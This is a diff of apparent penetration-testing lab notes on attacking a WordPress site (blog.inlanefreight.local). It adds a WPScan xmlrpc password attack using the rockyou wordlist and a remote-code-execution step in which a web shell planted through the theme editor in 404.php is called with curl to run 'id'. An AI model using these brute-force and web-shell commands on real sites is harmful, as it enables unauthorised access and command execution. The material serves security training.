@@ -56,9 +56,20 @@ curl http://<wordpress> | grep themes
 curl http://<wordpress> | grep plugins
 
 curl http://<wordpress>/?p=1 | grep plugins
-
-sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>
 ```
+```bash
+sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>
+
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
+### RCE
+- `Appearance-Theme Editor`
+<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />
+
+```bash
+curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+```
+
 
 </details>
 
